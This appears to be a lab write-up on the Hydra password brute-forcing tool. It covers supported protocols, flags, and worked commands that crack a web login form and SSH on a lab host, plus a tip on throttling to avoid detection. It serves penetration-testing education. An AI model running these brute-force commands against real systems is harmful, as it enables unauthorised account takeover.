## Hydra

### ðŸ”¹ What is Hydra?

Hydra is a fast, modular bruteâ€‘force online password cracking tool used to automate authentication guessing against many network protocols and web forms. Instead of manually trying passwords, Hydra iterates through username/password lists against a target service (SSH, FTP, HTTP forms, SMB, RDP, VNC, etc.) to find valid credentials.

Hydra's official repository lists support for many protocols, including (but not limited to):

> Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTPâ€‘FORMâ€‘GET, HTTPâ€‘FORMâ€‘POST, HTTPâ€‘GET, HTTPâ€‘HEAD, HTTPâ€‘POST, HTTPâ€‘PROXY, HTTPSâ€‘FORMâ€‘GET, HTTPSâ€‘FORMâ€‘POST, HTTPSâ€‘GET, HTTPSâ€‘HEAD, HTTPSâ€‘POST, HTTPâ€‘Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MSâ€‘SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PCâ€‘Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMwareâ€‘Auth, VNC and XMPP.

This breadth makes it a goâ€‘to tool for penetration testers when password guessing is required.

> **Security note:** Hydra is a powerful offensive tool. Use it only on systems you own or have explicit permission to test. Unauthorized brute force attacks are illegal and unethical.


#### Why password strength matters

If passwords are common, short (< 8 characters), or lack special characters, they are highly susceptible to cracking by wordlists (e.g., rockyou) and bruteâ€‘force tools like Hydra. Many outâ€‘ofâ€‘theâ€‘box devices and apps use default credentials (e.g., `admin:password`) â€” change defaults immediately.


#### Installing Hydra

* **Kali / AttackBox:** Hydra is preinstalled on Kali images and the AttackBox used in this course. Click **Start AttackBox** or **Start Kali Linux** and youâ€™ll have Hydra available.
* **Debian/Ubuntu:** `sudo apt install hydra`
* **Fedora:** `sudo dnf install hydra`
* **Source / THCâ€‘Hydra repo:** Clone and build from the official repository if you prefer the latest version.


#### Usage basics

Hydraâ€™s command structure varies by protocol. Common flags:

* `-l <user>` â€” single username
* `-L <userlist>` â€” file with usernames
* `-p <pass>` â€” single password
* `-P <passlist>` â€” file with passwords (e.g., rockyou)
* `<target>` â€” IP or hostname
* `<module>` â€” service or protocol (e.g., `ssh`, `ftp`, or `http-post-form`)

For HTTP form attacks `http-form-post` (or `http-post-form`) requires the login URI and the form fields, and a string that identifies a failed login.

Syntax example for HTTP form:

```
hydra -l <user> -P <wordlist> <target> http-post-form "/path:field_user=^USER^&field_pass=^PASS^:Failure-String"
```

`^USER^` and `^PASS^` are placeholders Hydra replaces with username and password guesses.

### ðŸ”¹Practical examples (from the lab)

### 1) Brute forcing a web login form

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.62.115 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
```

**Result (example):**

```
username: molly
password: sunshine
```

After successful login to the web app the file `flag1.txt` was found.

### 2) Targeting SSH

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.62.115 ssh
```

**Result (example):**

```
username: molly
password: butterfly
```

Then use the discovered credentials to SSH:

```
ssh molly@10.201.62.115
# password: butterfly
```

On the remote host:

```
molly@10.201.62.115$ ls
flag2.txt
```

### ðŸ”¹ Tips & best practices

* **Throttle requests** if testing real networks to avoid account lockouts and to reduce detection. Use options like `-t` (tasks/threads) judiciously.
* **Target specific accounts** rather than wide spray attacks when possible.
* **Choose appropriate wordlists:** `rockyou.txt` is common for practice; customize lists for real engagements.
* **Respect rate limits and monitoring systems.** Many services will lock accounts or trigger alerts on repeated failed attempts.


#### Common Hydra flags (quick reference)

* `-s <port>` â€” specify a nonâ€‘standard port
* `-V` â€” verbose (show each attempt)
* `-t <tasks>` â€” number of parallel tasks
* `-f` â€” exit after first valid credential found
* `-w <timeout>` â€” network timeout
* `-o <file>` â€” write found credentials to file

* Check your distributionâ€™s Hydra man page (`man hydra`) or `hydra -h` for a full option list.
* Kali tools page for Hydra contains useful examples and protocol notes.
